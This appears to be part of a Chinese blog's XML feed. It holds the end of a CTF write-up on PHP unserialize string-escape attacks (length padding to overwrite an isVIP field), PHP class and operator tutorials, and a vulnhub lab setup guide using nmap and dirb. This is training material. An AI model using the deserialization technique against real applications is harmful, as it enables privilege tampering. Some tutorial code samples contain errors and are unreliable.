O:4:"user":3:&#123;s:8:"username";s:5:"admin";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><pre><code class="php">  &lt;?php  class user&#123;      public $username;      public $password;      public $isVIP;            public function __construct($u,$p)&#123;          $this -&gt; username=$u;          $this -&gt; password=$p;          $this -&gt; isVIP = 0;      &#125;      &#125;        public function filter($s)&#123;          return str_replace(&#39;admin&#39;,&#39;hacker&#39;,$s);      &#125;    $u = new user(&#39;admin&#39;,&#39;123456&#39;);  $u_serialize = serialize($u);  $us = filter($u_serialize);  echo $us;  ?&gt;    //  O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</code></pre></li><li><p>修改锁死的属性，第一步，将传入的第一个参数给出的结果从后引号开始复制，然后将锁死的变量值改为需要的值</p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220808184509.png"></p></li></ol><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220808184543.png"></p><ol start="4"><li><p>注意，第一个 <strong>}</strong> 后面的payload会被直接忽略</p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220808184957.png"></p></li><li><p>修改锁死的属性，第二步，strlen一下，看看一共多出来多少字符数，根据上面的《计算公式》，算出需要多少个原始payload（admin），再根据前面的数值，看看单引号里面的数值，不够就添，够了就删，凑够即可反序列化成功</p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220808185235.png"></p></li></ol><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220808185329.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP中的类</title>
      <link href="/PHP%E7%9A%84%E7%B1%BB/"/>
      <url>/PHP%E7%9A%84%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP中的类"><a href="#PHP中的类" class="headerlink" title="PHP中的类"></a>PHP中的类</h1><h2 id="PHP中private、public、protected的区别详解"><a href="#PHP中private、public、protected的区别详解" class="headerlink" title="PHP中private、public、protected的区别详解"></a>PHP中private、public、protected的区别详解</h2><ol><li>  public表示全局，类内部和外部的子类都可以访问</li><li>  private表示私有的，只有本类内部可以使用</li><li>  protected表示受保护的，只有本类或子类或父类中可以访问</li><li>  所以限制最高，安全最好的是priva</li></ol><h2 id="public公有类型"><a href="#public公有类型" class="headerlink" title="public公有类型"></a>public公有类型</h2><ol><li>  在子类中可以通过 <strong>self::属性名</strong> 调用public方法或书信，<strong>parent::属性名</strong> 调用父类方法</li><li>  在实例中可以通过 $obj-&gt;属性名来调用public类型的方法或属性</li></ol><h2 id="protected受保护类型"><a href="#protected受保护类型" class="headerlink" title="protected受保护类型"></a>protected受保护类型</h2><ol><li>  在子类中可以通过 <strong>self::属性名</strong> 调用protected方法或属性，parent::属性名调用父类方法</li><li>  和public的区别在于：不能在类的外部调用，只能在本类，子类和父类中访问</li></ol><h2 id="private私有属性"><a href="#private私有属性" class="headerlink" title="private私有属性"></a>private私有属性</h2><ol><li>  该类的属性和方法只能在该类中使用</li><li>  该类的实例，子类中和子类的实例中都不能调用私有类型的属性和方法</li></ol><h1 id="PHP-new-实例化对象"><a href="#PHP-new-实例化对象" class="headerlink" title="PHP new:实例化对象"></a>PHP new:实例化对象</h1><ol><li>  使用类中的属性和方法不像使用变量和函数那样简单，首先要对类进行实例化</li></ol><h2 id="实例化对象"><a href="#实例化对象" class="headerlink" title="实例化对象"></a>实例化对象</h2><ol><li>  将类实例化成对象非常容易，只需要使用new关键字并在后面加上一个和类同名的方法（**实际上就是new 类名()**）即可</li><li>  如果在实例化对象时不需要为对象传递参数，在new关键字后面直接使用类名称即可，不需要加上括号</li></ol><pre class="line-numbers language-php" data-language="php"><code class="language-php">变量名 <span class="token operator">=</span> <span class="token keyword">new</span> 类名<span class="token punctuation">(</span>参数列表<span class="token punctuation">)</span><span class="token punctuation">;</span>或变量名 <span class="token operator">=</span> <span class="token keyword">new</span> 类名<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h3><ol><li>  变量名：通过类所创建的一个对象的引用名称，可以通过这个名称来访问对象的成员</li><li>  new关键字，表明要创建一个新的对象</li><li>  类名：表示新对象的类型</li><li>  参数列表：指定类的构造方法用于初始化对象的值，如果类中没有定义构造函数，PHP会自动创建一个不带参数的默认构造函数</li></ol><h2 id="创建一个类并将其实例化"><a href="#创建一个类并将其实例化" class="headerlink" title="创建一个类并将其实例化"></a>创建一个类并将其实例化</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">students</span><span class="token punctuation">&#123;</span><span class="token operator">...</span><span class="token punctuation">&#125;</span><span class="token variable">$person1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">students</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$person2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">students</span><span class="token punctuation">;</span><span class="token variable">$person3</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">students</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>  一个类可以实例化出多个对象，每个对象都是独立的。</li><li>  上面的代码中通过students类实例化出三个对象，person1,person2,person3,相当于在内存中开辟了三分空间用于存放每个对象</li><li>  使用同一个类声明的多个对象之间是没有联系的，只能说明他们都是同一个类型，每个对象内部都有类中声明的成员属性和成员方法</li><li>  好比类型都是人，但是每个人都有自己的姓名，年龄，等等属性是不同的</li></ol><h2 id="访问对象中的成员"><a href="#访问对象中的成员" class="headerlink" title="访问对象中的成员"></a>访问对象中的成员</h2><ol><li>  对象中包含成员属性和成员方法，访问对象中的成员和访问数组中的元素相似，只能通过对象的引用来访问对象中的成员</li><li>  使用 <strong>-&gt;</strong> 来完成对象成员的访问</li></ol><pre class="line-numbers language-php" data-language="php"><code class="language-php">变量名 <span class="token operator">=</span> <span class="token keyword">new</span> 类（参数）<span class="token punctuation">;</span>  <span class="token comment">//实例化一个类</span>变量名 <span class="token operator">-></span> 成员属性 <span class="token operator">=</span> 值；  <span class="token comment">//为成员属性赋值</span>变量名 <span class="token operator">-></span> 成员属性<span class="token punctuation">;</span>  <span class="token comment">//直接获取成员属性的值</span>变量名 <span class="token operator">-></span> 成员方法<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 访问对象中的成员方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">web</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">,</span><span class="token variable">$title</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">demo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'成员方法 demo()'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$student</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">web</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//进行实例化</span><span class="token variable">$student</span> <span class="token operator">-></span> <span class="token property">name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'xxx'</span><span class="token punctuation">;</span> <span class="token comment">// 给web类变量student中的变量name赋值为xxx</span><span class="token variable">$student</span> <span class="token operator">-></span> <span class="token property">url</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'xxx'</span><span class="token punctuation">;</span> <span class="token comment">// 给web类实例化后的变量student中的url赋值为xxx</span><span class="token keyword">echo</span> <span class="token variable">$student</span> <span class="token operator">-></span> <span class="token property">name</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$student</span> <span class="token operator">-></span> <span class="token property">url</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="this关键字"><a href="#this关键字" class="headerlink" title="this关键字"></a>this关键字</h2><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><ol><li>  this关键字的作用是：在实例化对象的时候用来规定指向谁</li><li>  this就是指向当前对象实例的指针，它不指向任何其它的对象或类</li><li>  $this-&gt;表示在类的本身内部使用本类的属性或方法，      <strong>指向当前类的实例化对象后的指针</strong></li></ol><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">user</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">getname</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">name</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$user1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$user1</span> <span class="token operator">-></span> <span class="token property">name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'张三'</span><span class="token punctuation">;</span><span class="token variable">$user1</span> <span class="token operator">-></span> <span class="token function">getname</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 这里就会输出张三<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="关于什么是对象"><a href="#关于什么是对象" class="headerlink" title="关于什么是对象"></a>关于什么是对象</h2><ol><li><p>  变量是对象，函数是对象，类也是对象</p></li><li><p>  变量的类型有很多，变量属于类类型（和类很类似）。广义地讲，对象包含了变量，即变量也可以称为一种对象，狭义地讲，将对象看作类的实例，对象是某个类的对象。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP中的=&gt;-&gt;和::的用法</title>
      <link href="/PHP%E7%AE%AD%E5%A4%B4/"/>
      <url>/PHP%E7%AE%AD%E5%A4%B4/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP中-gt-和-gt-以及-符号的用法"><a href="#PHP中-gt-和-gt-以及-符号的用法" class="headerlink" title="PHP中=&gt;和-&gt;以及::符号的用法"></a>PHP中=&gt;和-&gt;以及::符号的用法</h1><h2 id="gt-的用法"><a href="#gt-的用法" class="headerlink" title="-&gt;的用法"></a>-&gt;的用法</h2><ol><li>插入式解引用操作符</li><li>用于类里，访问类里的函数或对象,就是在类里面定义了一个函数，使用-&gt;可以调用这个类里面的函数<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function-definition function">do_test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"doing foo."</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$bar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">;</span><span class="token variable">$bar</span> <span class="token operator">=</span> <span class="token function">do_test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>-&gt;用来引用对象的成员（属性和方法），即可以调用类里面定义的函数和变量<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$arr</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span> <span class="token operator">=></span> <span class="token number">123</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'b'</span> <span class="token operator">=></span> <span class="token number">456</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token operator">=</span><span class="token number">456</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$obj</span> <span class="token operator">-></span> <span class="token property">a</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="gt-的用法-1"><a href="#gt-的用法-1" class="headerlink" title="=&gt;的用法"></a>=&gt;的用法</h2><ol><li><p>创建关联数组时，经常使用=&gt;来操作数组</p> <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$new_array</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span>in <span class="token operator">=></span> <span class="token string single-quoted-string">'reply'</span><span class="token punctuation">,</span>side <span class="token operator">=></span> <span class="token string single-quoted-string">'left'</span><span class="token punctuation">,</span>padx <span class="token operator">=></span> <span class="token number">2</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p> 如果需要使用数字大于等于的符号，应该使用&gt;=而不是=&gt;</p></li><li><p>php中数组默认键名为整数，也可以自己定义任意字符键名，最好有实际意义，例如</p> <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$css</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'style'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'0'</span><span class="token punctuation">;</span><span class="token string single-quoted-string">'color'</span><span class="token operator">=></span><span class="token string single-quoted-string">'green'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$css</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'style'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token punctuation">,</span><span class="token variable">$css</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'color'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'green'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p> 综上，=&gt;的作用就是用来给数组中的值赋值</p></li></ol><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$arr</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'one'</span> <span class="token operator">=></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword type-declaration">array</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'one'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="的用法"><a href="#的用法" class="headerlink" title="::的用法"></a>::的用法</h2><ol><li>  双冒号操作符，即作用域限定操作符，可以访问静态，const，类中重写的属性和方法</li></ol><h3 id="用变量在类定义外部访问"><a href="#用变量在类定义外部访问" class="headerlink" title="用变量在类定义外部访问"></a>用变量在类定义外部访问</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">fruit</span><span class="token punctuation">&#123;</span><span class="token keyword">const</span> <span class="token constant">CONST_VALUE</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'fruit color'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$classname</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'fruit'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$classname</span><span class="token operator">::</span><span class="token constant">CONST_VALUE</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token class-name static-context">fruit</span><span class="token operator">::</span><span class="token constant">CONST_VALUE</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="在类定义外部使用"><a href="#在类定义外部使用" class="headerlink" title="在类定义外部使用"></a>在类定义外部使用</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">fruit</span><span class="token punctuation">&#123;</span><span class="token keyword">const</span> <span class="token constant">const_value</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'fruit color'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">apple</span> <span class="token keyword">extends</span> <span class="token class-name">fruit</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token variable">$color</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'red'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">doubleColon</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token constant">CONST_VALUE</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'\n'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token variable">$color</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'\n'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token class-name static-context">apple</span><span class="token operator">::</span><span class="token function">doubleColon</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="调用parent方法"><a href="#调用parent方法" class="headerlink" title="调用parent方法"></a>调用parent方法</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">fruit</span><span class="token punctuation">&#123;</span><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">showcolor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"fruit::showcolor()\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">apple</span> <span class="token keyword">extends</span> <span class="token class-name">fruit</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">showcolor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">showcolor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"apple::showcolor()\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$apple</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">apple</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$apple</span> <span class="token operator">=</span> <span class="token function">showcolor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="面向对象self和parent的区别"><a href="#面向对象self和parent的区别" class="headerlink" title="面向对象self和parent的区别"></a>面向对象self和parent的区别</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Par</span><span class="token punctuation">&#123;</span><span class="token comment">//父类</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'小红漂亮'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">TITLE</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'阿里巴巴'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Chi</span> <span class="token keyword">extends</span> <span class="token class-name">Par</span> <span class="token comment">//子类</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'小黄最帅'</span><span class="token punctuation">;</span><span class="token comment">//子类静态属性</span>    <span class="token keyword">const</span> <span class="token constant">TITLE</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'刘强东|京东'</span><span class="token punctuation">;</span><span class="token comment">//子类常量</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">demo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'自己的静态属性:'</span><span class="token operator">.</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$str</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;br>父类的静态属性:'</span><span class="token operator">.</span><span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$str</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;br>自己的常量强东:'</span><span class="token operator">.</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">TITLE</span><span class="token punctuation">;</span>        <span class="token variable">$str</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;br>父类的常量阿里:'</span><span class="token operator">.</span><span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token constant">TITLE</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$obj</span> <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Chi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$obj</span><span class="token operator">-></span><span class="token function">demo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>  相同点：self和parent都是调用父类的属性或者方法</li><li>  不同点：如果两个属性一样，假如都叫$name ，那么self::调用的是自己类中的，parent::则是调用父类的</li></ol><h2 id="php中extends"><a href="#php中extends" class="headerlink" title="php中extends"></a>php中extends</h2><ol><li><p>在php中，extends关键字用于定义类的继承，语法为</p>  <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> 子类 <span class="token keyword">extends</span> 父类<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  通过该关键字可以实现单继承，一个类只能从另一个类中继承数据，但一个类可以有多个子类</p></li><li><p>  即一个子类只能有一个父类，但是一个父类可以有多个子类，一对多的关系</p></li><li><p>  在c++中，一个子类可以继承一个基类，也可以继承多个基类，继承一个基类称为单继承，继承多个基类，称为多继承</p></li><li><p>  但是在php中没有多继承，只能使用单继承，也就是说，一个类只能直接从另一个类中继承数据，但是一个类可以有多个子类</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶场搭建</title>
      <link href="/vulnhub%E9%9D%B6%E6%9C%BA%E6%90%AD%E5%BB%BA/"/>
      <url>/vulnhub%E9%9D%B6%E6%9C%BA%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="vulnhub靶机搭建"><a href="#vulnhub靶机搭建" class="headerlink" title="vulnhub靶机搭建"></a>vulnhub靶机搭建</h1><h2 id="预先准备工具"><a href="#预先准备工具" class="headerlink" title="预先准备工具"></a>预先准备工具</h2><ol><li>vulnhub官网的靶机(ova文件)<a href="https://www.vulnhub.com/![](https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220726110103.png)">https://www.vulnhub.com/![](https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220726110103.png)</a></li><li>virtualbox<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220726110144.png"></li><li>vmware</li><li>一个Linux环境，从虚拟机里开或者直接装子系统都可以</li></ol><h2 id="virtualbox的使用"><a href="#virtualbox的使用" class="headerlink" title="virtualbox的使用"></a>virtualbox的使用</h2><ol><li>在virtualbox主界面的页面中点击导入<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220726110331.png"></li><li>给文件<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220726110408.png"></li><li>配设置<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220726110430.png"></li><li>为了能使虚拟机能够操作vulnhub靶机，将他们放到同一个网段下，使用桥接模式，在某一个特定的虚拟机下 点击设置–&gt;点击网络–&gt;点击连接方式–&gt;点击桥接网卡<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220726110628.png"></li></ol><h3 id="virtualbox的报错问题"><a href="#virtualbox的报错问题" class="headerlink" title="virtualbox的报错问题"></a>virtualbox的报错问题</h3><ol><li>无法导入虚拟机文件–&gt;重装virtualbox，将virtualbox的安装地址设为默认</li><li>还是不行，到官网去下载插件，<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220726111302.png">，将插件放到和virtualbox同一个目录下，并且将插件导入到virtualbox中</li><li>在virtualbox的主界面点击拓展，点击右侧加号，导入插件即可<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220726111437.png"></li></ol><h2 id="使用Linux命令找到同一个网段下的vulnhub靶机"><a href="#使用Linux命令找到同一个网段下的vulnhub靶机" class="headerlink" title="使用Linux命令找到同一个网段下的vulnhub靶机"></a>使用Linux命令找到同一个网段下的vulnhub靶机</h2><ol><li>ip a (ip addr)命令的缩写，可以查看到本机联网的IP地址,其中eth0的网卡即为我们联网的IP<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220726112040.png"></li><li>查看子网掩码，区分网络号和主机号</li><li>将网络号不变，主机号设为0，加上后面的/24</li><li>nmap扫描这个得到的不同的IP地址，扫描到的端口一个一个送到浏览器里去，查看是不是靶机的页面即可</li></ol><h2 id="查看这个靶机下的不同目录"><a href="#查看这个靶机下的不同目录" class="headerlink" title="查看这个靶机下的不同目录"></a>查看这个靶机下的不同目录</h2><ol><li>dirb命令</li><li>查看帮助文档 man + 命令名称</li><li>dirb URL 即可查看到这个目录下所有的文件</li><li>得到的带’+‘的即为扫描得到的文件结果<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220726113005.png"></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
